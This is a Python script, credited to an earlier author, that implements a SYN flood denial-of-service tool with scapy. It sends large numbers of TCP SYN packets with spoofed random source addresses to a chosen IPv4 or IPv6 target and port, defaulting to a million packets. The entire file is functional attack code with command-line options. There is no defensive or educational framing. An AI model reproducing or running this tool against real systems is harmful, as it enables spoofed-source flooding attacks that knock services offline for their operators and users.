#!/usr/bin/env python

"""
Syn flood script in python

Original from # Emre Ovunc # info@emreovunc.com
Python SYN Flood Tool CMD v2.0.1
"""


import sys
from random import randint
from argparse import ArgumentParser
import scapy.all


NOTICE = f"""usage: {sys.argv[0]} [-h] [--target TARGET] [--port PORT] [--count COUNT] [--version]
    optional arguments:
        -h, --help show this help message and exit
        --target TARGET, -t TARGET target IP address
        --port PORT, -p PORT target port number
        --count COUNT, -c COUNT number of packets
        --version, -v show programs version number and exit
"""


def random_ip():
    """ generate a random IP number """
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip


def rand_int():
    """ return a random integer """
    x = randint(1000, 9000)
    return x


def syn_flood(dst_ip, dst_port, counter):
    """ syn flood tcpv4 """
    total = 0
    print("IPv4 Packets are sending ...")

    for _x in range (0, counter):
        s_port = rand_int()
        s_eq = rand_int()
        w_indow = rand_int()

        # pylint: disable=no-member
        ip_packet = scapy.all.IP()
        ip_packet.src = random_ip()
        ip_packet.dst = dst_ip

        # pylint: disable=no-member
        tcp_packet = scapy.all.TCP()
        tcp_packet.sport = s_port
        tcp_packet.dport = int(dst_port)
        tcp_packet.flags = "S"
        tcp_packet.seq = s_eq
        tcp_packet.window = w_indow

        scapy.all.send(ip_packet/tcp_packet, verbose=0)
        total+=1

    sys.stdout.write(f"\nTotal packets sent: {total}\n")

def syn_flood_v6(dst_ip, dst_port, counter):
    """ SYN flood in TCP v6 """
    total = 0
    print ("IPv6 Packets are sending ...")

    for _x in range (0, counter):
        s_port = rand_int()
        s_eq = rand_int()
        w_indow = rand_int()

        # pylint: disable=no-member
        ip_packet = scapy.all.IPv6()
        ip_packet.src = scapy.all.RandIP6()
        ip_packet.dst = dst_ip

        # pylint: disable=no-member
        tcp_packet = scapy.all.TCP()
        tcp_packet.sport = s_port
        tcp_packet.dport = int(dst_port)
        tcp_packet.flags = "S"
        tcp_packet.seq = s_eq
        tcp_packet.window = w_indow

        scapy.all.send(ip_packet/tcp_packet, verbose=0)
        total+=1

    sys.stdout.write(f"\nTotal packets sent: {total}\n")


def main():
    """ main entry point """
    parser = ArgumentParser()
    parser.add_argument("--target", "-t", help="target IP address", default="server")
    parser.add_argument("--port", "-p", help="target port number", default="8080")
    parser.add_argument("--count", "-c", help="number of packets", default="1000000")
    parser.add_argument("--format", "-f", help="format of target(Can ignore, default use ipv4)")
    parser.add_argument("--version", "-v", action="version", version="Python SynFlood Tool v2.0.1")
    parser.epilog = f"Usage: {sys.argv[0]} -t 10.20.30.40 -p 8080 -c 1 -f 6"

    args = parser.parse_args()

    if args.target is not None:
        if args.port is not None:
            if args.count is None:
                print("[!]You did not use --counter/-c parameter, so 1 packet will be sent..")
                syn_flood(args.target, args.port, 1)

            else:
                print(f"args.format = {args.format}")
                if args.format == "6":
                    syn_flood_v6(args.target, args.port, int(args.count))
                else:
                    syn_flood(args.target, args.port, int(args.count))

        else:
            print("[-]Please, use --port/-p to give targets port!")
            print("[!]Example: -p 445")
            print("[?] -h for help")
            sys.exit(1)
    else:
        print(NOTICE)
        sys.exit(1)

main()
